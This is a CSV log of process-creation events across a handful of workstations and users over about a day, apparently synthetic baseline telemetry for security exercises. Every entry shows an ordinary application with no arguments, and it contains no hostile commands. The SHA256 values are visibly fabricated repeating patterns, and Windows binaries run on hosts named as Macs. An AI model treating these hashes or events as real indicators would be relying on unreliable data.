2026-03-11 22:28:14.250,BLD-RUN-02,a.velasquez,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=0014963369e7ed7c0014963369e7ed7c0014963369e7ed7c0014963369e7ed7c
2026-03-11 22:40:01.458,FIN-WS31,a.velasquez,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=001780dbc91e4bdf001780dbc91e4bdf001780dbc91e4bdf001780dbc91e4bdf
2026-03-11 22:47:35.962,FIN-WS22,e.park,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=002337bf44adb65c002337bf44adb65c002337bf44adb65c002337bf44adb65c
2026-03-11 22:54:51.696,FIN-WS22,a.velasquez,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=001fc427fe5b2641001fc427fe5b2641001fc427fe5b2641001fc427fe5b2641
2026-03-11 23:05:57.116,FIN-WS22,l.chen,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=00170d7cfa78846700170d7cfa78846700170d7cfa78846700170d7cfa788467
2026-03-11 23:17:28.318,FIN-WS31,r.kapoor,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=00187f8de055a70100187f8de055a70100187f8de055a70100187f8de055a701
2026-03-11 23:31:02.180,FIN-WS22,a.velasquez,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=000560c16d9b3573000560c16d9b3573000560c16d9b3573000560c16d9b3573
2026-03-11 23:36:02.634,BLD-RUN-02,a.velasquez,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=0022e2ed0fd0c62c0022e2ed0fd0c62c0022e2ed0fd0c62c0022e2ed0fd0c62c
2026-03-11 23:47:22.527,MAC-DEV-04,t.owens,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=001a17292f3ee1c8001a17292f3ee1c8001a17292f3ee1c8001a17292f3ee1c8
2026-03-11 23:57:42.002,MAC-DEV-17,m.sato,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=000ec0c8ec39d41a000ec0c8ec39d41a000ec0c8ec39d41a000ec0c8ec39d41a
2026-03-12 00:01:01.720,BLD-RUN-02,r.kapoor,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=0006a670d1fb78440006a670d1fb78440006a670d1fb78440006a670d1fb7844
2026-03-12 00:14:53.870,FIN-WS22,n.byrd,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=0017c81b6288f9ed0017c81b6288f9ed0017c81b6288f9ed0017c81b6288f9ed
2026-03-12 00:18:06.470,FIN-WS22,e.park,1,git,"git",explorer.exe,,,SHA256=0000521e86f9fc7b0000521e86f9fc7b0000521e86f9fc7b0000521e86f9fc7b
2026-03-12 00:26:01.599,MAC-DEV-04,t.owens,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=0020927c198775220020927c198775220020927c198775220020927c19877522
2026-03-12 00:31:20.526,BLD-RUN-02,a.velasquez,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=002225d7f2a104de002225d7f2a104de002225d7f2a104de002225d7f2a104de
2026-03-12 00:40:12.554,MAC-DEV-17,n.byrd,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=0008c956314442c70008c956314442c70008c956314442c70008c956314442c7
2026-03-12 00:53:40.778,BLD-RUN-02,e.park,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=00071ae93a9a4e6800071ae93a9a4e6800071ae93a9a4e6800071ae93a9a4e68
2026-03-12 01:07:26.015,FIN-WS22,a.velasquez,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=0012ed9c297901210012ed9c297901210012ed9c297901210012ed9c29790121
2026-03-12 01:17:54.195,BLD-RUN-02,m.sato,1,git,"git",explorer.exe,,,SHA256=000436a487ccdc69000436a487ccdc69000436a487ccdc69000436a487ccdc69
2026-03-12 01:28:08.546,MAC-DEV-17,r.kapoor,1,node,"node",explorer.exe,,,SHA256=001e0ad9af5262b5001e0ad9af5262b5001e0ad9af5262b5001e0ad9af5262b5
2026-03-12 01:36:19.686,MAC-DEV-17,e.park,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=0018a457ddc1f6650018a457ddc1f6650018a457ddc1f6650018a457ddc1f665
2026-03-12 01:49:51.216,BLD-RUN-02,m.sato,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=001ada7b4cd83412001ada7b4cd83412001ada7b4cd83412001ada7b4cd83412
2026-03-12 01:59:09.251,FIN-WS22,e.park,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=001de513717fbb22001de513717fbb22001de513717fbb22001de513717fbb22
2026-03-12 02:03:20.320,FIN-WS22,l.chen,1,node,"node",explorer.exe,,,SHA256=00180e792679bdde00180e792679bdde00180e792679bdde00180e792679bdde
2026-03-12 02:08:46.681,MAC-DEV-04,t.owens,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=001e248afb4abf5a001e248afb4abf5a001e248afb4abf5a001e248afb4abf5a
2026-03-12 02:18:54.719,MAC-DEV-17,m.sato,1,node,"node",explorer.exe,,,SHA256=0010c108d509c6e70010c108d509c6e70010c108d509c6e70010c108d509c6e7
2026-03-12 02:23:38.305,BLD-RUN-02,n.byrd,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=001785a84da097a8001785a84da097a8001785a84da097a8001785a84da097a8
2026-03-12 02:34:32.338,FIN-WS31,a.velasquez,1,git,"git",explorer.exe,,,SHA256=001d30c36f81b64a001d30c36f81b64a001d30c36f81b64a001d30c36f81b64a
2026-03-12 02:48:47.583,MAC-DEV-04,l.chen,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=0012e60d89c810a90012e60d89c810a90012e60d89c810a90012e60d89c810a9
2026-03-12 02:58:19.522,MAC-DEV-04,r.kapoor,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=002356f4304ce3ea002356f4304ce3ea002356f4304ce3ea002356f4304ce3ea
2026-03-12 03:09:42.543,MAC-DEV-04,m.sato,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=0010f099d21685760010f099d21685760010f099d21685760010f099d2168576
2026-03-12 03:19:33.577,FIN-WS31,t.owens,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=00164fe7fb0715d400164fe7fb0715d400164fe7fb0715d400164fe7fb0715d4
2026-03-12 03:23:30.793,MAC-DEV-04,t.owens,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=000533c10d750bce000533c10d750bce000533c10d750bce000533c10d750bce
2026-03-12 03:28:24.643,FIN-WS22,t.owens,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=00158dc00d2c0b4600158dc00d2c0b4600158dc00d2c0b4600158dc00d2c0b46
2026-03-12 03:35:29.966,FIN-WS31,t.owens,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=00055976c6db5eb200055976c6db5eb200055976c6db5eb200055976c6db5eb2
2026-03-12 03:46:41.886,BLD-RUN-02,r.kapoor,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=00023abd6316da6100023abd6316da6100023abd6316da6100023abd6316da61
2026-03-12 03:49:50.643,FIN-WS31,r.kapoor,1,node,"node",explorer.exe,,,SHA256=00177132692e5b4500177132692e5b4500177132692e5b4500177132692e5b45
2026-03-12 03:53:24.478,BLD-RUN-02,l.chen,1,node,"node",explorer.exe,,,SHA256=00136f47e2785be300136f47e2785be300136f47e2785be300136f47e2785be3
2026-03-12 04:02:32.839,FIN-WS22,a.velasquez,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=000c89753af1d927000c89753af1d927000c89753af1d927000c89753af1d927
2026-03-12 04:15:53.884,MAC-DEV-17,l.chen,1,git,"git",explorer.exe,,,SHA256=0014b367c061f8520014b367c061f8520014b367c061f8520014b367c061f852
2026-03-12 04:26:24.795,FIN-WS22,e.park,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=000e76df3d0376aa000e76df3d0376aa000e76df3d0376aa000e76df3d0376aa
2026-03-12 04:38:34.147,FIN-WS22,a.velasquez,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=0017874b7fec74790017874b7fec74790017874b7fec74790017874b7fec7479
2026-03-12 04:45:42.769,BLD-RUN-02,e.park,1,git,"git",explorer.exe,,,SHA256=00125431127bea8f00125431127bea8f00125431127bea8f00125431127bea8f
2026-03-12 04:55:15.062,MAC-DEV-17,t.owens,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=000ccea358d0e735000ccea358d0e735000ccea358d0e735000ccea358d0e735
2026-03-12 05:09:51.617,BLD-RUN-02,m.sato,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=001813e4d92a6026001813e4d92a6026001813e4d92a6026001813e4d92a6026
2026-03-12 05:16:13.035,BLD-RUN-02,m.sato,1,git,"git",explorer.exe,,,SHA256=0005db5b0e6960dd0005db5b0e6960dd0005db5b0e6960dd0005db5b0e6960dd
2026-03-12 05:19:16.865,FIN-WS22,l.chen,1,git,"git",explorer.exe,,,SHA256=0001f67513efa0140001f67513efa0140001f67513efa0140001f67513efa014
2026-03-12 05:24:39.793,BLD-RUN-02,e.park,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=00216c5804030cc200216c5804030cc200216c5804030cc200216c5804030cc2
2026-03-12 05:39:28.479,FIN-WS31,m.sato,1,git,"git",explorer.exe,,,SHA256=000c9a006ff11f07000c9a006ff11f07000c9a006ff11f07000c9a006ff11f07
2026-03-12 05:50:13.692,MAC-DEV-04,m.sato,1,node,"node",explorer.exe,,,SHA256=0007503c375d47a10007503c375d47a10007503c375d47a10007503c375d47a1
2026-03-12 05:54:23.406,MAC-DEV-17,t.owens,1,git,"git",explorer.exe,,,SHA256=0008aaedd8cecd170008aaedd8cecd170008aaedd8cecd170008aaedd8cecd17
2026-03-12 06:06:45.934,MAC-DEV-04,l.chen,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=0017440fe88c5a040017440fe88c5a040017440fe88c5a040017440fe88c5a04
2026-03-12 06:17:26.902,FIN-WS22,m.sato,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=0004506643607baf0004506643607baf0004506643607baf0004506643607baf
2026-03-12 06:26:38.297,MAC-DEV-04,m.sato,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=00079ae1980ecbdb00079ae1980ecbdb00079ae1980ecbdb00079ae1980ecbdb
2026-03-12 06:36:10.454,BLD-RUN-02,a.velasquez,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=000d8698e3323532000d8698e3323532000d8698e3323532000d8698e3323532
2026-03-12 06:45:23.693,FIN-WS22,e.park,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=000d3d02a465aed5000d3d02a465aed5000d3d02a465aed5000d3d02a465aed5
2026-03-12 06:59:15.498,FIN-WS31,n.byrd,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=00000aa8004ec0b200000aa8004ec0b200000aa8004ec0b200000aa8004ec0b2
2026-03-12 07:08:19.868,MAC-DEV-17,t.owens,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=000747bafc8c5743000747bafc8c5743000747bafc8c5743000747bafc8c5743
2026-03-12 07:18:15.858,MAC-DEV-04,r.kapoor,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=00050d8a90fb157a00050d8a90fb157a00050d8a90fb157a00050d8a90fb157a
2026-03-12 07:28:13.477,FIN-WS31,e.park,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=000ee4a00a85d78e000ee4a00a85d78e000ee4a00a85d78e000ee4a00a85d78e
2026-03-12 07:35:56.650,MAC-DEV-04,t.owens,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=0008b73e6e2b853a0008b73e6e2b853a0008b73e6e2b853a0008b73e6e2b853a
2026-03-12 07:46:00.408,MAC-DEV-17,n.byrd,1,node,"node",explorer.exe,,,SHA256=001232fe4f19c083001232fe4f19c083001232fe4f19c083001232fe4f19c083
2026-03-12 07:57:32.087,MAC-DEV-04,e.park,1,node,"node",explorer.exe,,,SHA256=00094771865a310900094771865a310900094771865a310900094771865a3109
2026-03-12 08:06:22.384,BLD-RUN-02,r.kapoor,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=001a1d82a36a38fe001a1d82a36a38fe001a1d82a36a38fe001a1d82a36a38fe
2026-03-12 08:17:17.849,MAC-DEV-04,t.owens,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=001db2d2aa6ec4ac001db2d2aa6ec4ac001db2d2aa6ec4ac001db2d2aa6ec4ac
2026-03-12 08:31:53.165,MAC-DEV-17,m.sato,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=0016f3be227101c80016f3be227101c80016f3be227101c80016f3be227101c8
2026-03-12 08:45:14.315,MAC-DEV-17,n.byrd,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=0020ad9bd392c4ba0020ad9bd392c4ba0020ad9bd392c4ba0020ad9bd392c4ba
2026-03-12 08:52:04.032,MAC-DEV-04,a.velasquez,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=00159347be367e9a00159347be367e9a00159347be367e9a00159347be367e9a
2026-03-12 09:00:13.642,FIN-WS31,r.kapoor,1,node,"node",explorer.exe,,,SHA256=000431dbf14ac78f000431dbf14ac78f000431dbf14ac78f000431dbf14ac78f
2026-03-12 09:04:51.209,MAC-DEV-04,m.sato,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=00082451c8dbf39e00082451c8dbf39e00082451c8dbf39e00082451c8dbf39e
2026-03-12 09:07:55.212,MAC-DEV-17,m.sato,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=0011c2d6051306350011c2d6051306350011c2d6051306350011c2d605130635
2026-03-12 09:11:41.425,MAC-DEV-17,a.velasquez,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=00138b361a88def500138b361a88def500138b361a88def500138b361a88def5
2026-03-12 09:17:49.123,FIN-WS22,e.park,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=000ba4849f77a1aa000ba4849f77a1aa000ba4849f77a1aa000ba4849f77a1aa
2026-03-12 09:21:59.497,BLD-RUN-02,n.byrd,1,git,"git",explorer.exe,,,SHA256=0007b19357583ffc0007b19357583ffc0007b19357583ffc0007b19357583ffc
2026-03-12 09:36:44.865,MAC-DEV-17,l.chen,1,node,"node",explorer.exe,,,SHA256=00149c10382f122d00149c10382f122d00149c10382f122d00149c10382f122d
2026-03-12 09:47:47.519,MAC-DEV-17,m.sato,1,node,"node",explorer.exe,,,SHA256=0005ccd2e147ca700005ccd2e147ca700005ccd2e147ca700005ccd2e147ca70
2026-03-12 09:55:50.900,FIN-WS31,m.sato,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=000118017bc3496e000118017bc3496e000118017bc3496e000118017bc3496e
2026-03-12 10:09:42.629,FIN-WS31,m.sato,1,git,"git",explorer.exe,,,SHA256=001e2e4fb065019d001e2e4fb065019d001e2e4fb065019d001e2e4fb065019d
2026-03-12 10:17:09.285,FIN-WS31,l.chen,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=000b62a9e0646de6000b62a9e0646de6000b62a9e0646de6000b62a9e0646de6
2026-03-12 10:27:53.210,MAC-DEV-04,a.velasquez,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=0001a0835b2c18340001a0835b2c18340001a0835b2c18340001a0835b2c1834
2026-03-12 10:42:46.490,MAC-DEV-04,a.velasquez,1,git,"git",explorer.exe,,,SHA256=001a40c577708c96001a40c577708c96001a40c577708c96001a40c577708c96
2026-03-12 10:45:55.472,MAC-DEV-04,m.sato,1,git,"git",explorer.exe,,,SHA256=0001baa25c50c3900001baa25c50c3900001baa25c50c3900001baa25c50c390
2026-03-12 10:55:55.914,FIN-WS22,l.chen,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=00163c0babe17ffc00163c0babe17ffc00163c0babe17ffc00163c0babe17ffc
2026-03-12 11:02:07.395,MAC-DEV-04,t.owens,1,node,"node",explorer.exe,,,SHA256=000354ef73ab0560000354ef73ab0560000354ef73ab0560000354ef73ab0560
2026-03-12 11:10:28.056,FIN-WS22,e.park,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=0007bca2ade8660b0007bca2ade8660b0007bca2ade8660b0007bca2ade8660b
2026-03-12 11:14:58.839,BLD-RUN-02,t.owens,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=00070c7d4fd2d51100070c7d4fd2d51100070c7d4fd2d51100070c7d4fd2d511
2026-03-12 11:24:09.586,MAC-DEV-17,a.velasquez,1,git,"git",explorer.exe,,,SHA256=0019dbf6fb56a4600019dbf6fb56a4600019dbf6fb56a4600019dbf6fb56a460
2026-03-12 11:36:08.815,MAC-DEV-04,r.kapoor,1,node,"node",explorer.exe,,,SHA256=001afed7cf619a7e001afed7cf619a7e001afed7cf619a7e001afed7cf619a7e
2026-03-12 11:42:11.449,BLD-RUN-02,a.velasquez,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=0008fbbc0aa8790c0008fbbc0aa8790c0008fbbc0aa8790c0008fbbc0aa8790c
2026-03-12 11:51:17.422,FIN-WS31,e.park,1,node,"node",explorer.exe,,,SHA256=0012b0fdd54c25990012b0fdd54c25990012b0fdd54c25990012b0fdd54c2599
2026-03-12 11:59:37.375,BLD-RUN-02,n.byrd,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=0002b91815a4bfa50002b91815a4bfa50002b91815a4bfa50002b91815a4bfa5
2026-03-12 12:13:44.369,MAC-DEV-17,l.chen,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=0003a78cbc854b390003a78cbc854b390003a78cbc854b390003a78cbc854b39
2026-03-12 12:19:36.471,MAC-DEV-17,r.kapoor,1,git,"git",explorer.exe,,,SHA256=001f9bdf2611b58d001f9bdf2611b58d001f9bdf2611b58d001f9bdf2611b58d
2026-03-12 12:33:52.149,FIN-WS22,t.owens,1,git,"git",explorer.exe,,,SHA256=0012cd615d2c1d330012cd615d2c1d330012cd615d2c1d330012cd615d2c1d33
2026-03-12 12:37:35.766,FIN-WS31,e.park,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=00184019005b757c00184019005b757c00184019005b757c00184019005b757c
2026-03-12 12:44:03.571,FIN-WS31,r.kapoor,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=001911d30aa2e454001911d30aa2e454001911d30aa2e454001911d30aa2e454
2026-03-12 12:55:49.313,MAC-DEV-17,n.byrd,1,node,"node",explorer.exe,,,SHA256=000eaa1d0a1969dd000eaa1d0a1969dd000eaa1d0a1969dd000eaa1d0a1969dd
2026-03-12 13:08:14.171,FIN-WS31,r.kapoor,1,git,"git",explorer.exe,,,SHA256=000572481fbe250f000572481fbe250f000572481fbe250f000572481fbe250f
2026-03-12 13:20:08.589,FIN-WS22,r.kapoor,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=000aa0735324667c000aa0735324667c000aa0735324667c000aa0735324667c
2026-03-12 13:28:33.857,MAC-DEV-04,e.park,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=001c08defcbd1bd3001c08defcbd1bd3001c08defcbd1bd3001c08defcbd1bd3
2026-03-12 13:40:43.097,MAC-DEV-17,l.chen,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=0014954470bb458e0014954470bb458e0014954470bb458e0014954470bb458e
2026-03-12 13:54:22.653,MAC-DEV-17,m.sato,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=0017f2bbf226d45a0017f2bbf226d45a0017f2bbf226d45a0017f2bbf226d45a
2026-03-12 14:03:19.154,BLD-RUN-02,a.velasquez,1,git,"git",explorer.exe,,,SHA256=0003153c600a19250003153c600a19250003153c600a19250003153c600a1925
2026-03-12 14:10:56.409,MAC-DEV-04,r.kapoor,1,git,"git",explorer.exe,,,SHA256=000393d29704577d000393d29704577d000393d29704577d000393d29704577d
2026-03-12 14:24:07.456,MAC-DEV-17,e.park,1,node,"node",explorer.exe,,,SHA256=001f0e75adeb1190001f0e75adeb1190001f0e75adeb1190001f0e75adeb1190
2026-03-12 14:29:43.561,MAC-DEV-17,e.park,1,git,"git",explorer.exe,,,SHA256=00114cb5eebdf54f00114cb5eebdf54f00114cb5eebdf54f00114cb5eebdf54f
2026-03-12 14:34:55.014,FIN-WS22,n.byrd,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=00171289d2c7722600171289d2c7722600171289d2c7722600171289d2c77226
2026-03-12 14:49:37.201,MAC-DEV-04,e.park,1,git,"git",explorer.exe,,,SHA256=000e679ce1de7d86000e679ce1de7d86000e679ce1de7d86000e679ce1de7d86
2026-03-12 14:53:33.101,BLD-RUN-02,a.velasquez,1,node,"node",explorer.exe,,,SHA256=001c69ea5a18219d001c69ea5a18219d001c69ea5a18219d001c69ea5a18219d
2026-03-12 15:02:21.633,MAC-DEV-17,e.park,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=00091d8ae7f6d68800091d8ae7f6d68800091d8ae7f6d68800091d8ae7f6d688
2026-03-12 15:16:38.814,MAC-DEV-04,r.kapoor,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=0014b7aafb64dfdd0014b7aafb64dfdd0014b7aafb64dfdd0014b7aafb64dfdd
2026-03-12 15:28:42.944,MAC-DEV-17,l.chen,1,git,"git",explorer.exe,,,SHA256=00175dc512f9e38700175dc512f9e38700175dc512f9e38700175dc512f9e387
2026-03-12 15:38:32.303,MAC-DEV-17,e.park,1,node,"node",explorer.exe,,,SHA256=0010aa50c567c2dc0010aa50c567c2dc0010aa50c567c2dc0010aa50c567c2dc
2026-03-12 15:43:52.724,MAC-DEV-04,t.owens,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=0004a01540d89c980004a01540d89c980004a01540d89c980004a01540d89c98
2026-03-12 15:57:53.645,MAC-DEV-17,a.velasquez,1,git,"git",explorer.exe,,,SHA256=0020fbc4c70d9d1e0020fbc4c70d9d1e0020fbc4c70d9d1e0020fbc4c70d9d1e
2026-03-12 16:11:26.623,MAC-DEV-04,t.owens,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=000672b8d5e3afb0000672b8d5e3afb0000672b8d5e3afb0000672b8d5e3afb0
2026-03-12 16:20:51.228,FIN-WS22,a.velasquez,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=0000885035462bbe0000885035462bbe0000885035462bbe0000885035462bbe
2026-03-12 16:33:38.704,BLD-RUN-02,n.byrd,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=00225da60ad587de00225da60ad587de00225da60ad587de00225da60ad587de
2026-03-12 16:45:26.347,FIN-WS31,a.velasquez,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=0005e81cbaa4af350005e81cbaa4af350005e81cbaa4af350005e81cbaa4af35
2026-03-12 16:56:22.309,BLD-RUN-02,n.byrd,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=000f90297f334040000f90297f334040000f90297f334040000f90297f334040
2026-03-12 17:05:05.072,MAC-DEV-17,n.byrd,1,node,"node",explorer.exe,,,SHA256=0014b76c695fb12f0014b76c695fb12f0014b76c695fb12f0014b76c695fb12f
2026-03-12 17:08:22.107,FIN-WS31,r.kapoor,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=001c0aa0b9eb6291001c0aa0b9eb6291001c0aa0b9eb6291001c0aa0b9eb6291
2026-03-12 17:14:47.201,MAC-DEV-17,n.byrd,1,node,"node",explorer.exe,,,SHA256=00170f3395b5833000170f3395b5833000170f3395b5833000170f3395b58330
2026-03-12 17:21:03.938,FIN-WS31,a.velasquez,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=0007658a50506d330007658a50506d330007658a50506d330007658a50506d33
2026-03-12 17:27:21.917,FIN-WS22,l.chen,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=0020ccb5933b44ea0020ccb5933b44ea0020ccb5933b44ea0020ccb5933b44ea
2026-03-12 17:33:12.711,BLD-RUN-02,n.byrd,1,git,"git",explorer.exe,,,SHA256=00200929663e8b2200200929663e8b2200200929663e8b2200200929663e8b22
2026-03-12 17:45:59.445,MAC-DEV-04,l.chen,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=00158b0a5bdd4e5900158b0a5bdd4e5900158b0a5bdd4e5900158b0a5bdd4e59
2026-03-12 17:53:57.742,MAC-DEV-17,t.owens,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=00098461b89fb83c00098461b89fb83c00098461b89fb83c00098461b89fb83c
2026-03-12 17:59:16.267,BLD-RUN-02,a.velasquez,1,node,"node",explorer.exe,,,SHA256=001e0387f370812a001e0387f370812a001e0387f370812a001e0387f370812a
2026-03-12 18:12:53.244,FIN-WS31,t.owens,1,node,"node",explorer.exe,,,SHA256=000df3f2772d4ec2000df3f2772d4ec2000df3f2772d4ec2000df3f2772d4ec2
2026-03-12 18:20:07.052,FIN-WS22,n.byrd,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=000425ccb1709600000425ccb1709600000425ccb1709600000425ccb1709600
2026-03-12 18:23:33.018,MAC-DEV-17,m.sato,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=001f729bb4eebef5001f729bb4eebef5001f729bb4eebef5001f729bb4eebef5
2026-03-12 18:27:08.174,MAC-DEV-17,e.park,1,git,"git",explorer.exe,,,SHA256=0001de92e10cc5880001de92e10cc5880001de92e10cc5880001de92e10cc588
2026-03-12 18:31:26.385,BLD-RUN-02,l.chen,1,git,"git",explorer.exe,,,SHA256=00221fabf534884000221fabf534884000221fabf534884000221fabf5348840
2026-03-12 18:45:44.202,FIN-WS31,l.chen,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=00185d70b01f828100185d70b01f828100185d70b01f828100185d70b01f8281
2026-03-12 18:54:10.924,MAC-DEV-17,n.byrd,1,git,"git",explorer.exe,,,SHA256=00197474f3c4835400197474f3c4835400197474f3c4835400197474f3c48354
2026-03-12 18:58:18.922,FIN-WS22,m.sato,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=00048919e6fe292200048919e6fe292200048919e6fe292200048919e6fe2922
2026-03-12 19:11:40.281,MAC-DEV-04,r.kapoor,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=0009b1a826c2b7160009b1a826c2b7160009b1a826c2b7160009b1a826c2b716
2026-03-12 19:18:04.900,FIN-WS22,r.kapoor,1,node,"node",explorer.exe,,,SHA256=000b6d6e8ee1e184000b6d6e8ee1e184000b6d6e8ee1e184000b6d6e8ee1e184
2026-03-12 19:26:05.998,MAC-DEV-04,e.park,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=00210e96d2645e5e00210e96d2645e5e00210e96d2645e5e00210e96d2645e5e
2026-03-12 19:33:09.183,MAC-DEV-04,n.byrd,1,node,"node",explorer.exe,,,SHA256=0017c805d37a45fb0017c805d37a45fb0017c805d37a45fb0017c805d37a45fb
2026-03-12 19:43:24.731,BLD-RUN-02,n.byrd,1,git,"git",explorer.exe,,,SHA256=000b197aac3702c5000b197aac3702c5000b197aac3702c5000b197aac3702c5
2026-03-12 19:54:46.159,BLD-RUN-02,e.park,1,node,"node",explorer.exe,,,SHA256=0008ccb130f1fb800008ccb130f1fb800008ccb130f1fb800008ccb130f1fb80
2026-03-12 20:09:30.063,MAC-DEV-04,r.kapoor,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=0016a5ad06b0b1210016a5ad06b0b1210016a5ad06b0b1210016a5ad06b0b121
2026-03-12 20:16:40.590,MAC-DEV-04,t.owens,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=001eb708ec5b21a1001eb708ec5b21a1001eb708ec5b21a1001eb708ec5b21a1
2026-03-12 20:20:05.248,MAC-DEV-04,m.sato,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=000e91190940de60000e91190940de60000e91190940de60000e91190940de60
2026-03-12 20:29:13.204,MAC-DEV-17,r.kapoor,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=0016e0ae4526a0850016e0ae4526a0850016e0ae4526a0850016e0ae4526a085
2026-03-12 20:34:43.241,MAC-DEV-04,m.sato,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=0021d9d5ee69a7de0021d9d5ee69a7de0021d9d5ee69a7de0021d9d5ee69a7de
2026-03-12 20:47:16.675,FIN-WS31,a.velasquez,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=002379bcab8bb712002379bcab8bb712002379bcab8bb712002379bcab8bb712
2026-03-12 20:57:17.183,MAC-DEV-04,n.byrd,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=0020adc897fd40660020adc897fd40660020adc897fd40660020adc897fd4066
2026-03-12 21:04:10.116,FIN-WS22,e.park,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=0002095b61d210390002095b61d210390002095b61d210390002095b61d21039
2026-03-12 21:08:51.729,MAC-DEV-04,a.velasquez,1,powershell.exe,"powershell.exe",explorer.exe,,,SHA256=0009aae5d0d1a3840009aae5d0d1a3840009aae5d0d1a3840009aae5d0d1a384
2026-03-12 21:14:54.087,FIN-WS31,l.chen,1,chrome.exe,"chrome.exe",explorer.exe,,,SHA256=0017f840e20fe5e30017f840e20fe5e30017f840e20fe5e30017f840e20fe5e3
2026-03-12 21:25:17.084,FIN-WS22,n.byrd,1,slack.exe,"slack.exe",explorer.exe,,,SHA256=001a4329b8b3a2d4001a4329b8b3a2d4001a4329b8b3a2d4001a4329b8b3a2d4
2026-03-12 21:36:54.367,MAC-DEV-17,l.chen,1,outlook.exe,"outlook.exe",explorer.exe,,,SHA256=000d3122786ea122000d3122786ea122000d3122786ea122000d3122786ea122
2026-03-12 21:45:27.046,FIN-WS22,n.byrd,1,node,"node",explorer.exe,,,SHA256=0014d53c22961d640014d53c22961d640014d53c22961d640014d53c22961d64
